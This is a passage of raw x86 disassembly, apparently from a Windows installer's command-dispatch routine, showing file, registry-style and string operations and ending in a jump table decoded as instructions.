  4024c2:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  4024c6:	74 13                	je     0x4024db
  4024c8:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  4024cb:	74 06                	je     0x4024d3
  4024cd:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  4024d1:	75 1d                	jne    0x4024f0
  4024d3:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4024d6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4024d9:	eb 74                	jmp    0x40254f
  4024db:	ff 36                	push   (%esi)
  4024dd:	33 c0                	xor    %eax,%eax
  4024df:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4024e2:	56                   	push   %esi
  4024e3:	0f 94 c0             	sete   %al
  4024e6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4024e9:	e8 13 3d 00 00       	call   0x406201
  4024ee:	eb 66                	jmp    0x402556
  4024f0:	66 89 1e             	mov    %bx,(%esi)
  4024f3:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4024f6:	eb 5e                	jmp    0x402556
  4024f8:	68 19 00 02 00       	push   $0x20019
  4024fd:	e8 7f 07 00 00       	call   0x402c81
  402502:	6a 03                	push   $0x3
  402504:	8b f8                	mov    %eax,%edi
  402506:	e8 14 07 00 00       	call   0x402c1f
  40250b:	3b fb                	cmp    %ebx,%edi
  40250d:	59                   	pop    %ecx
  40250e:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  402511:	66 89 1e             	mov    %bx,(%esi)
  402514:	0f 84 71 03 00 00    	je     0x40288b
  40251a:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  40251d:	b9 ff 1f 00 00       	mov    $0x1fff,%ecx
  402522:	89 4d 08             	mov    %ecx,0x8(%ebp)
  402525:	74 0c                	je     0x402533
  402527:	51                   	push   %ecx
  402528:	56                   	push   %esi
  402529:	50                   	push   %eax
  40252a:	57                   	push   %edi
  40252b:	ff 15 30 80 40 00    	call   *0x408030
  402531:	eb 1c                	jmp    0x40254f
  402533:	53                   	push   %ebx
  402534:	53                   	push   %ebx
  402535:	53                   	push   %ebx
  402536:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402539:	53                   	push   %ebx
  40253a:	51                   	push   %ecx
  40253b:	56                   	push   %esi
  40253c:	50                   	push   %eax
  40253d:	57                   	push   %edi
  40253e:	ff 15 18 80 40 00    	call   *0x408018
  402544:	85 c0                	test   %eax,%eax
  402546:	74 07                	je     0x40254f
  402548:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40254f:	66 89 9e fe 3f 00 00 	mov    %bx,0x3ffe(%esi)
  402556:	57                   	push   %edi
  402557:	ff 15 24 80 40 00    	call   *0x408024
  40255d:	e9 63 05 00 00       	jmp    0x402ac5
  402562:	56                   	push   %esi
  402563:	e8 b2 3c 00 00       	call   0x40621a
  402568:	3b c3                	cmp    %ebx,%eax
  40256a:	0f 84 55 05 00 00    	je     0x402ac5
  402570:	50                   	push   %eax
  402571:	e9 d7 f9 ff ff       	jmp    0x401f4d
  402576:	6a ed                	push   $0xffffffed
  402578:	e8 c4 06 00 00       	call   0x402c41
  40257d:	ff 75 e0             	push   -0x20(%ebp)
  402580:	ff 75 dc             	push   -0x24(%ebp)
  402583:	50                   	push   %eax
  402584:	e8 27 38 00 00       	call   0x405db0
  402589:	83 f8 ff             	cmp    $0xffffffff,%eax
  40258c:	0f 84 f6 02 00 00    	je     0x402888
  402592:	50                   	push   %eax
  402593:	e9 d5 ef ff ff       	jmp    0x40156d
  402598:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40259b:	33 c9                	xor    %ecx,%ecx
  40259d:	83 fa 38             	cmp    $0x38,%edx
  4025a0:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  4025a3:	0f 94 c1             	sete   %cl
  4025a6:	3b c3                	cmp    %ebx,%eax
  4025a8:	8b f9                	mov    %ecx,%edi
  4025aa:	74 1b                	je     0x4025c7
  4025ac:	6a 01                	push   $0x1
  4025ae:	e8 6c 06 00 00       	call   0x402c1f
  4025b3:	66 a3 d0 e5 40 00    	mov    %ax,0x40e5d0
  4025b9:	33 c0                	xor    %eax,%eax
  4025bb:	3b fb                	cmp    %ebx,%edi
  4025bd:	59                   	pop    %ecx
  4025be:	0f 94 c0             	sete   %al
  4025c1:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  4025c4:	40                   	inc    %eax
  4025c5:	eb 43                	jmp    0x40260a
  4025c7:	83 fa 38             	cmp    $0x38,%edx
  4025ca:	75 2f                	jne    0x4025fb
  4025cc:	6a 21                	push   $0x21
  4025ce:	e8 6e 06 00 00       	call   0x402c41
  4025d3:	53                   	push   %ebx
  4025d4:	53                   	push   %ebx
  4025d5:	68 00 20 00 00       	push   $0x2000
  4025da:	68 d0 e5 40 00       	push   $0x40e5d0
  4025df:	6a ff                	push   $0xffffffff
  4025e1:	68 d0 25 41 00       	push   $0x4125d0
  4025e6:	53                   	push   %ebx
  4025e7:	53                   	push   %ebx
  4025e8:	ff 15 5c 81 40 00    	call   *0x40815c
  4025ee:	68 d0 e5 40 00       	push   $0x40e5d0
  4025f3:	ff 15 50 81 40 00    	call   *0x408150
  4025f9:	eb 0f                	jmp    0x40260a
  4025fb:	6a 11                	push   $0x11
  4025fd:	e8 3f 06 00 00       	call   0x402c41
  402602:	50                   	push   %eax
  402603:	e8 c8 3c 00 00       	call   0x4062d0
  402608:	03 c0                	add    %eax,%eax
  40260a:	66 39 1e             	cmp    %bx,(%esi)
  40260d:	89 45 08             	mov    %eax,0x8(%ebp)
  402610:	0f 84 75 02 00 00    	je     0x40288b
  402616:	56                   	push   %esi
  402617:	e8 fe 3b 00 00       	call   0x40621a
  40261c:	0b 7d b4             	or     -0x4c(%ebp),%edi
  40261f:	8b f0                	mov    %eax,%esi
  402621:	75 14                	jne    0x402637
  402623:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  402626:	74 0f                	je     0x402637
  402628:	56                   	push   %esi
  402629:	56                   	push   %esi
  40262a:	e8 62 38 00 00       	call   0x405e91
  40262f:	85 c0                	test   %eax,%eax
  402631:	0f 8c 54 02 00 00    	jl     0x40288b
  402637:	ff 75 08             	push   0x8(%ebp)
  40263a:	68 d0 e5 40 00       	push   $0x40e5d0
  40263f:	56                   	push   %esi
  402640:	e8 1d 38 00 00       	call   0x405e62
  402645:	e9 6a ef ff ff       	jmp    0x4015b4
  40264a:	6a 02                	push   $0x2
  40264c:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40264f:	58                   	pop    %eax
  402650:	50                   	push   %eax
  402651:	89 45 b8             	mov    %eax,-0x48(%ebp)
  402654:	e8 c6 05 00 00       	call   0x402c1f
  402659:	83 f8 01             	cmp    $0x1,%eax
  40265c:	59                   	pop    %ecx
  40265d:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  402660:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  402663:	0f 8c 5c 04 00 00    	jl     0x402ac5
  402669:	b9 ff 1f 00 00       	mov    $0x1fff,%ecx
  40266e:	3b c1                	cmp    %ecx,%eax
  402670:	7e 03                	jle    0x402675
  402672:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  402675:	66 39 1e             	cmp    %bx,(%esi)
  402678:	0f 84 5e 01 00 00    	je     0x4027dc
  40267e:	56                   	push   %esi
  40267f:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  402682:	e8 93 3b 00 00       	call   0x40621a
  402687:	39 5d c4             	cmp    %ebx,-0x3c(%ebp)
  40268a:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40268d:	0f 8e 49 01 00 00    	jle    0x4027dc
  402693:	8b 3d 58 81 40 00    	mov    0x408158,%edi
  402699:	83 7d d4 39          	cmpl   $0x39,-0x2c(%ebp)
  40269d:	0f 85 8f 00 00 00    	jne    0x402732
  4026a3:	8d 45 c8             	lea    -0x38(%ebp),%eax
  4026a6:	53                   	push   %ebx
  4026a7:	50                   	push   %eax
  4026a8:	6a 02                	push   $0x2
  4026aa:	58                   	pop    %eax
  4026ab:	2b 45 e4             	sub    -0x1c(%ebp),%eax
  4026ae:	50                   	push   %eax
  4026af:	8d 45 0a             	lea    0xa(%ebp),%eax
  4026b2:	50                   	push   %eax
  4026b3:	ff 75 f0             	push   -0x10(%ebp)
  4026b6:	ff 15 48 81 40 00    	call   *0x408148
  4026bc:	85 c0                	test   %eax,%eax
  4026be:	0f 84 18 01 00 00    	je     0x4027dc
  4026c4:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4026c7:	3b cb                	cmp    %ebx,%ecx
  4026c9:	0f 84 0d 01 00 00    	je     0x4027dc
  4026cf:	66 0f b6 45 0a       	movzbw 0xa(%ebp),%ax
  4026d4:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4026d7:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  4026da:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4026dd:	0f 85 b5 00 00 00    	jne    0x402798
  4026e3:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4026e6:	6a 01                	push   $0x1
  4026e8:	50                   	push   %eax
  4026e9:	8d 45 0a             	lea    0xa(%ebp),%eax
  4026ec:	51                   	push   %ecx
  4026ed:	50                   	push   %eax
  4026ee:	6a 08                	push   $0x8
  4026f0:	53                   	push   %ebx
  4026f1:	ff d7                	call   *%edi
  4026f3:	85 c0                	test   %eax,%eax
  4026f5:	75 68                	jne    0x40275f
  4026f7:	8b 75 b8             	mov    -0x48(%ebp),%esi
  4026fa:	f7 de                	neg    %esi
  4026fc:	ff 4d c8             	decl   -0x38(%ebp)
  4026ff:	b8 fd ff 00 00       	mov    $0xfffd,%eax
  402704:	89 45 bc             	mov    %eax,-0x44(%ebp)
  402707:	74 59                	je     0x402762
  402709:	ff 4d b8             	decl   -0x48(%ebp)
  40270c:	46                   	inc    %esi
  40270d:	6a 01                	push   $0x1
  40270f:	53                   	push   %ebx
  402710:	56                   	push   %esi
  402711:	ff 75 f0             	push   -0x10(%ebp)
  402714:	ff 15 44 81 40 00    	call   *0x408144
  40271a:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40271d:	6a 01                	push   $0x1
  40271f:	50                   	push   %eax
  402720:	8d 45 0a             	lea    0xa(%ebp),%eax
  402723:	ff 75 c8             	push   -0x38(%ebp)
  402726:	50                   	push   %eax
  402727:	6a 08                	push   $0x8
  402729:	53                   	push   %ebx
  40272a:	ff d7                	call   *%edi
  40272c:	85 c0                	test   %eax,%eax
  40272e:	74 cc                	je     0x4026fc
  402730:	eb 2d                	jmp    0x40275f
  402732:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  402735:	75 16                	jne    0x40274d
  402737:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  40273a:	75 11                	jne    0x40274d
  40273c:	53                   	push   %ebx
  40273d:	ff 75 f0             	push   -0x10(%ebp)
  402740:	e8 4c 37 00 00       	call   0x405e91
  402745:	85 c0                	test   %eax,%eax
  402747:	0f 8c 8f 00 00 00    	jl     0x4027dc
  40274d:	8d 45 bc             	lea    -0x44(%ebp),%eax
  402750:	6a 02                	push   $0x2
  402752:	50                   	push   %eax
  402753:	ff 75 f0             	push   -0x10(%ebp)
  402756:	e8 d8 36 00 00       	call   0x405e33
  40275b:	85 c0                	test   %eax,%eax
  40275d:	74 7d                	je     0x4027dc
  40275f:	8b 45 bc             	mov    -0x44(%ebp),%eax
  402762:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  402765:	75 31                	jne    0x402798
  402767:	66 83 7d d0 0d       	cmpw   $0xd,-0x30(%ebp)
  40276c:	74 3b                	je     0x4027a9
  40276e:	66 83 7d d0 0a       	cmpw   $0xa,-0x30(%ebp)
  402773:	74 34                	je     0x4027a9
  402775:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402778:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40277b:	ff 45 f8             	incl   -0x8(%ebp)
  40277e:	66 3b c3             	cmp    %bx,%ax
  402781:	66 89 04 51          	mov    %ax,(%ecx,%edx,2)
  402785:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402788:	74 52                	je     0x4027dc
  40278a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40278d:	3b 45 c4             	cmp    -0x3c(%ebp),%eax
  402790:	0f 8c 03 ff ff ff    	jl     0x402699
  402796:	eb 44                	jmp    0x4027dc
  402798:	0f b7 c0             	movzwl %ax,%eax
  40279b:	50                   	push   %eax
  40279c:	ff 75 f4             	push   -0xc(%ebp)
  40279f:	e8 5d 3a 00 00       	call   0x406201
  4027a4:	e9 25 03 00 00       	jmp    0x402ace
  4027a9:	66 39 45 d0          	cmp    %ax,-0x30(%ebp)
  4027ad:	74 1b                	je     0x4027ca
  4027af:	66 3d 0d 00          	cmp    $0xd,%ax
  4027b3:	74 06                	je     0x4027bb
  4027b5:	66 3d 0a 00          	cmp    $0xa,%ax
  4027b9:	75 0f                	jne    0x4027ca
  4027bb:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4027be:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4027c1:	ff 45 f8             	incl   -0x8(%ebp)
  4027c4:	66 89 04 51          	mov    %ax,(%ecx,%edx,2)
  4027c8:	eb 12                	jmp    0x4027dc
  4027ca:	8b 45 b8             	mov    -0x48(%ebp),%eax
  4027cd:	6a 01                	push   $0x1
  4027cf:	f7 d8                	neg    %eax
  4027d1:	53                   	push   %ebx
  4027d2:	50                   	push   %eax
  4027d3:	ff 75 f0             	push   -0x10(%ebp)
  4027d6:	ff 15 44 81 40 00    	call   *0x408144
  4027dc:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4027df:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4027e2:	3b c3                	cmp    %ebx,%eax
  4027e4:	66 89 1c 41          	mov    %bx,(%ecx,%eax,2)
  4027e8:	e9 c9 ed ff ff       	jmp    0x4015b6
  4027ed:	66 39 1e             	cmp    %bx,(%esi)
  4027f0:	0f 84 cf 02 00 00    	je     0x402ac5
  4027f6:	6a 02                	push   $0x2
  4027f8:	e8 22 04 00 00       	call   0x402c1f
  4027fd:	59                   	pop    %ecx
  4027fe:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  402801:	ff 75 e4             	push   -0x1c(%ebp)
  402804:	53                   	push   %ebx
  402805:	50                   	push   %eax
  402806:	56                   	push   %esi
  402807:	e8 0e 3a 00 00       	call   0x40621a
  40280c:	50                   	push   %eax
  40280d:	ff 15 44 81 40 00    	call   *0x408144
  402813:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402816:	0f 8c a9 02 00 00    	jl     0x402ac5
  40281c:	e9 46 02 00 00       	jmp    0x402a67
  402821:	56                   	push   %esi
  402822:	e8 f3 39 00 00       	call   0x40621a
  402827:	3b c3                	cmp    %ebx,%eax
  402829:	0f 84 96 02 00 00    	je     0x402ac5
  40282f:	50                   	push   %eax
  402830:	ff 15 4c 81 40 00    	call   *0x40814c
  402836:	e9 8a 02 00 00       	jmp    0x402ac5
  40283b:	ff 75 f4             	push   -0xc(%ebp)
  40283e:	e8 d7 39 00 00       	call   0x40621a
  402843:	3b c3                	cmp    %ebx,%eax
  402845:	74 12                	je     0x402859
  402847:	8d 8d 2c fd ff ff    	lea    -0x2d4(%ebp),%ecx
  40284d:	51                   	push   %ecx
  40284e:	50                   	push   %eax
  40284f:	ff 15 3c 81 40 00    	call   *0x40813c
  402855:	85 c0                	test   %eax,%eax
  402857:	75 47                	jne    0x4028a0
  402859:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402860:	66 89 1e             	mov    %bx,(%esi)
  402863:	e9 5d 02 00 00       	jmp    0x402ac5
  402868:	6a 02                	push   $0x2
  40286a:	e8 d2 03 00 00       	call   0x402c41
  40286f:	8d 8d 2c fd ff ff    	lea    -0x2d4(%ebp),%ecx
  402875:	51                   	push   %ecx
  402876:	50                   	push   %eax
  402877:	ff 15 38 81 40 00    	call   *0x408138
  40287d:	83 f8 ff             	cmp    $0xffffffff,%eax
  402880:	75 15                	jne    0x402897
  402882:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402885:	66 89 18             	mov    %bx,(%eax)
  402888:	66 89 1e             	mov    %bx,(%esi)
  40288b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402892:	e9 2e 02 00 00       	jmp    0x402ac5
  402897:	50                   	push   %eax
  402898:	ff 75 f4             	push   -0xc(%ebp)
  40289b:	e8 61 39 00 00       	call   0x406201
  4028a0:	8d 85 58 fd ff ff    	lea    -0x2a8(%ebp),%eax
  4028a6:	50                   	push   %eax
  4028a7:	56                   	push   %esi
  4028a8:	e9 34 01 00 00       	jmp    0x4029e1
  4028ad:	6a f0                	push   $0xfffffff0
  4028af:	c7 45 d0 66 fd ff ff 	movl   $0xfffffd66,-0x30(%ebp)
  4028b6:	e8 86 03 00 00       	call   0x402c41
  4028bb:	8b f0                	mov    %eax,%esi
  4028bd:	56                   	push   %esi
  4028be:	89 75 c8             	mov    %esi,-0x38(%ebp)
  4028c1:	e8 40 33 00 00       	call   0x405c06
  4028c6:	85 c0                	test   %eax,%eax
  4028c8:	75 07                	jne    0x4028d1
  4028ca:	6a ed                	push   $0xffffffed
  4028cc:	e8 70 03 00 00       	call   0x402c41
  4028d1:	56                   	push   %esi
  4028d2:	e8 b4 34 00 00       	call   0x405d8b
  4028d7:	6a 02                	push   $0x2
  4028d9:	68 00 00 00 40       	push   $0x40000000
  4028de:	56                   	push   %esi
  4028df:	e8 cc 34 00 00       	call   0x405db0
  4028e4:	83 f8 ff             	cmp    $0xffffffff,%eax
  4028e7:	89 45 08             	mov    %eax,0x8(%ebp)
  4028ea:	0f 84 97 00 00 00    	je     0x402987
  4028f0:	a1 f8 ae 47 00       	mov    0x47aef8,%eax
  4028f5:	8b 35 34 81 40 00    	mov    0x408134,%esi
  4028fb:	50                   	push   %eax
  4028fc:	6a 40                	push   $0x40
  4028fe:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  402901:	ff d6                	call   *%esi
  402903:	8b f8                	mov    %eax,%edi
  402905:	3b fb                	cmp    %ebx,%edi
  402907:	74 75                	je     0x40297e
  402909:	53                   	push   %ebx
  40290a:	e8 38 0a 00 00       	call   0x403347
  40290f:	ff 75 c4             	push   -0x3c(%ebp)
  402912:	57                   	push   %edi
  402913:	e8 19 0a 00 00       	call   0x403331
  402918:	ff 75 e0             	push   -0x20(%ebp)
  40291b:	6a 40                	push   $0x40
  40291d:	ff d6                	call   *%esi
  40291f:	8b f0                	mov    %eax,%esi
  402921:	3b f3                	cmp    %ebx,%esi
  402923:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  402926:	74 34                	je     0x40295c
  402928:	ff 75 e0             	push   -0x20(%ebp)
  40292b:	56                   	push   %esi
  40292c:	53                   	push   %ebx
  40292d:	ff 75 dc             	push   -0x24(%ebp)
  402930:	e8 e1 07 00 00       	call   0x403116
  402935:	eb 18                	jmp    0x40294f
  402937:	8b 0e                	mov    (%esi),%ecx
  402939:	8b 46 04             	mov    0x4(%esi),%eax
  40293c:	83 c6 08             	add    $0x8,%esi
  40293f:	51                   	push   %ecx
  402940:	03 c7                	add    %edi,%eax
  402942:	56                   	push   %esi
  402943:	50                   	push   %eax
  402944:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  402947:	e8 1f 34 00 00       	call   0x405d6b
  40294c:	03 75 cc             	add    -0x34(%ebp),%esi
  40294f:	38 1e                	cmp    %bl,(%esi)
  402951:	75 e4                	jne    0x402937
  402953:	ff 75 b4             	push   -0x4c(%ebp)
  402956:	ff 15 28 81 40 00    	call   *0x408128
  40295c:	ff 75 c4             	push   -0x3c(%ebp)
  40295f:	57                   	push   %edi
  402960:	ff 75 08             	push   0x8(%ebp)
  402963:	e8 fa 34 00 00       	call   0x405e62
  402968:	57                   	push   %edi
  402969:	ff 15 28 81 40 00    	call   *0x408128
  40296f:	53                   	push   %ebx
  402970:	53                   	push   %ebx
  402971:	ff 75 08             	push   0x8(%ebp)
  402974:	6a ff                	push   $0xffffffff
  402976:	e8 9b 07 00 00       	call   0x403116
  40297b:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40297e:	ff 75 08             	push   0x8(%ebp)
  402981:	ff 15 20 81 40 00    	call   *0x408120
  402987:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  40298a:	6a f3                	push   $0xfffffff3
  40298c:	5e                   	pop    %esi
  40298d:	7d 13                	jge    0x4029a2
  40298f:	6a ef                	push   $0xffffffef
  402991:	5e                   	pop    %esi
  402992:	ff 75 c8             	push   -0x38(%ebp)
  402995:	ff 15 40 81 40 00    	call   *0x408140
  40299b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4029a2:	56                   	push   %esi
  4029a3:	e9 a3 f8 ff ff       	jmp    0x40224b
  4029a8:	53                   	push   %ebx
  4029a9:	e8 71 02 00 00       	call   0x402c1f
  4029ae:	8b f8                	mov    %eax,%edi
  4029b0:	59                   	pop    %ecx
  4029b1:	3b 3d 2c af 47 00    	cmp    0x47af2c,%edi
  4029b7:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  4029ba:	0f 83 cb fe ff ff    	jae    0x40288b
  4029c0:	8b f7                	mov    %edi,%esi
  4029c2:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4029c5:	69 f6 18 40 00 00    	imul   $0x4018,%esi,%esi
  4029cb:	03 35 28 af 47 00    	add    0x47af28,%esi
  4029d1:	3b c3                	cmp    %ebx,%eax
  4029d3:	7c 19                	jl     0x4029ee
  4029d5:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  4029d8:	75 11                	jne    0x4029eb
  4029da:	83 c6 18             	add    $0x18,%esi
  4029dd:	56                   	push   %esi
  4029de:	ff 75 f4             	push   -0xc(%ebp)
  4029e1:	e8 d4 38 00 00       	call   0x4062ba
  4029e6:	e9 da 00 00 00       	jmp    0x402ac5
  4029eb:	51                   	push   %ecx
  4029ec:	eb 7a                	jmp    0x402a68
  4029ee:	83 c9 ff             	or     $0xffffffff,%ecx
  4029f1:	2b c8                	sub    %eax,%ecx
  4029f3:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4029f6:	74 10                	je     0x402a08
  4029f8:	6a 01                	push   $0x1
  4029fa:	e8 20 02 00 00       	call   0x402c1f
  4029ff:	59                   	pop    %ecx
  402a00:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  402a03:	89 45 dc             	mov    %eax,-0x24(%ebp)
  402a06:	eb 10                	jmp    0x402a18
  402a08:	ff 75 e8             	push   -0x18(%ebp)
  402a0b:	8d 46 18             	lea    0x18(%esi),%eax
  402a0e:	50                   	push   %eax
  402a0f:	e8 c8 38 00 00       	call   0x4062dc
  402a14:	80 4e 09 01          	orb    $0x1,0x9(%esi)
  402a18:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402a1b:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  402a1e:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  402a21:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  402a24:	0f 84 9b 00 00 00    	je     0x402ac5
  402a2a:	57                   	push   %edi
  402a2b:	e8 4d e7 ff ff       	call   0x40117d
  402a30:	e9 90 00 00 00       	jmp    0x402ac5
  402a35:	53                   	push   %ebx
  402a36:	e8 e4 01 00 00       	call   0x402c1f
  402a3b:	83 f8 20             	cmp    $0x20,%eax
  402a3e:	59                   	pop    %ecx
  402a3f:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  402a42:	0f 83 43 fe ff ff    	jae    0x40288b
  402a48:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  402a4b:	74 25                	je     0x402a72
  402a4d:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402a50:	74 0f                	je     0x402a61
  402a52:	50                   	push   %eax
  402a53:	e8 41 e8 ff ff       	call   0x401299
  402a58:	53                   	push   %ebx
  402a59:	53                   	push   %ebx
  402a5a:	e8 90 e7 ff ff       	call   0x4011ef
  402a5f:	eb 64                	jmp    0x402ac5
  402a61:	53                   	push   %ebx
  402a62:	e8 7b e8 ff ff       	call   0x4012e2
  402a67:	50                   	push   %eax
  402a68:	ff 75 f4             	push   -0xc(%ebp)
  402a6b:	e8 91 37 00 00       	call   0x406201
  402a70:	eb 53                	jmp    0x402ac5
  402a72:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402a75:	74 12                	je     0x402a89
  402a77:	8b 15 f4 ae 47 00    	mov    0x47aef4,%edx
  402a7d:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  402a80:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  402a87:	eb 3c                	jmp    0x402ac5
  402a89:	8b 0d f4 ae 47 00    	mov    0x47aef4,%ecx
  402a8f:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  402a96:	ff 75 f4             	push   -0xc(%ebp)
  402a99:	e8 3e 38 00 00       	call   0x4062dc
  402a9e:	eb 25                	jmp    0x402ac5
  402aa0:	8b 0d 48 02 46 00    	mov    0x460248,%ecx
  402aa6:	53                   	push   %ebx
  402aa7:	23 c8                	and    %eax,%ecx
  402aa9:	51                   	push   %ecx
  402aaa:	6a 0b                	push   $0xb
  402aac:	ff 75 f8             	push   -0x8(%ebp)
  402aaf:	ff 15 18 82 40 00    	call   *0x408218
  402ab5:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402ab8:	74 0b                	je     0x402ac5
  402aba:	53                   	push   %ebx
  402abb:	53                   	push   %ebx
  402abc:	ff 75 f8             	push   -0x8(%ebp)
  402abf:	ff 15 14 82 40 00    	call   *0x408214
  402ac5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402ac8:	01 05 88 af 47 00    	add    %eax,0x47af88
  402ace:	33 c0                	xor    %eax,%eax
  402ad0:	5f                   	pop    %edi
  402ad1:	5e                   	pop    %esi
  402ad2:	5b                   	pop    %ebx
  402ad3:	c9                   	leave
  402ad4:	c2 04 00             	ret    $0x4
  402ad7:	d0 2a                	shrb   $1,(%edx)
  402ad9:	40                   	inc    %eax
  402ada:	00 91 14 40 00 9d    	add    %dl,-0x62ffbfec(%ecx)
  402ae0:	14 40                	adc    $0x40,%al
  402ae2:	00 b8 14 40 00 cb    	add    %bh,-0x34ffbfec(%eax)
  402ae8:	14 40                	adc    $0x40,%al
  402aea:	00 d7                	add    %dl,%bh
  402aec:	14 40                	adc    $0x40,%al
  402aee:	00 f5                	add    %dh,%ch
  402af0:	14 40                	adc    $0x40,%al
  402af2:	00 73 15             	add    %dh,0x15(%ebx)
  402af5:	40                   	inc    %eax
  402af6:	00 a3 15 40 00 c1    	add    %ah,-0x3effbfeb(%ebx)
  402afc:	15 40 00 6a 16       	adc    $0x166a0040,%eax
  402b01:	40                   	inc    %eax
  402b02:	00 03                	add    %al,(%ebx)
  402b04:	15 40 00 42 15       	adc    $0x15420040,%eax
  402b09:	40                   	inc    %eax
  402b0a:	00 63 15             	add    %ah,0x15(%ebx)
  402b0d:	40                   	inc    %eax
  402b0e:	00 7b 16             	add    %bh,0x16(%ebx)
  402b11:	40                   	inc    %eax
  402b12:	00 cc                	add    %cl,%ah
  402b14:	16                   	push   %ss
  402b15:	40                   	inc    %eax
  402b16:	00 35 17 40 00 5c    	add    %dh,0x5c004017
  402b1c:	17                   	pop    %ss
  402b1d:	40                   	inc    %eax
  402b1e:	00 6f 17             	add    %ch,0x17(%edi)
  402b21:	40                   	inc    %eax
  402b22:	00 0c 19             	add    %cl,(%ecx,%ebx,1)
  402b25:	40                   	inc    %eax
  402b26:	00 0f                	add    %cl,(%edi)
  402b28:	19 40 00             	sbb    %eax,0x0(%eax)
  402b2b:	41                   	inc    %ecx
  402b2c:	19 40 00             	sbb    %eax,0x0(%eax)
  402b2f:	56                   	push   %esi
  402b30:	19 40 00             	sbb    %eax,0x0(%eax)
  402b33:	68 19 40 00 ff       	push   $0xff004019
  402b38:	19 40 00             	sbb    %eax,0x0(%eax)
  402b3b:	30 1a                	xor    %bl,(%edx)
  402b3d:	40                   	inc    %eax
  402b3e:	00 72 1a             	add    %dh,0x1a(%edx)
  402b41:	40                   	inc    %eax
  402b42:	00 b2 1a 40 00 53    	add    %dh,0x5300401a(%edx)
  402b48:	1b 40 00             	sbb    0x0(%eax),%eax
  402b4b:	77 1b                	ja     0x402b68
  402b4d:	40                   	inc    %eax
  402b4e:	00 1f                	add    %bl,(%edi)
  402b50:	1c 40                	sbb    $0x40,%al
  402b52:	00 1f                	add    %bl,(%edi)
  402b54:	1c 40                	sbb    $0x40,%al
  402b56:	00 f3                	add    %dh,%bl
  402b58:	1c 40                	sbb    $0x40,%al
  402b5a:	00 14 1d 40 00 39 1d 	add    %dl,0x1d390040(,%ebx,1)
  402b61:	40                   	inc    %eax
  402b62:	00 5d 1d             	add    %bl,0x1d(%ebp)
  402b65:	40                   	inc    %eax
  402b66:	00 b9 1d 40 00 49    	add    %bh,0x4900401d(%ecx)
  402b6c:	1e                   	push   %ds
  402b6d:	40                   	inc    %eax
  402b6e:	00 7d 1e             	add    %bh,0x1e(%ebp)
  402b71:	40                   	inc    %eax
  402b72:	00 06                	add    %al,(%esi)
  402b74:	1f                   	pop    %ds
  402b75:	40                   	inc    %eax
  402b76:	00 58 1f             	add    %bl,0x1f(%eax)
  402b79:	40                   	inc    %eax
  402b7a:	00 8c 1f 40 00 31 20 	add    %cl,0x20310040(%edi,%ebx,1)
  402b81:	40                   	inc    %eax
  402b82:	00 04 21             	add    %al,(%ecx,%eiz,1)
  402b85:	40                   	inc    %eax
